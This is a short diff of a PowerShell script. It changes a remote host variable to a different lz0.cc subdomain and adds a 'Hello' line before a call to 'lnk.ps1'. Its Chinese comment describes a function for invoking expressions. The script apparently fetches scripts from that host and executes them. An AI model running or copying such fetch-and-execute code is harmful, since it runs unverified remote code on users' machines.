@@ -1,4 +1,4 @@
-$Web = "http://Get.lz0.cc"
+$Web = "http://c1is.lz0.cc"
 $Temp = $env:TEMP
 
 # 定义 "call" 函数，用于调用表达式
@@ -18,5 +18,6 @@ if($PSVersionTable.BuildVersion.Major -lt 10)
 
 if(!$LUserName)
 {
+    write "Hello"
     call "lnk.ps1"
 }
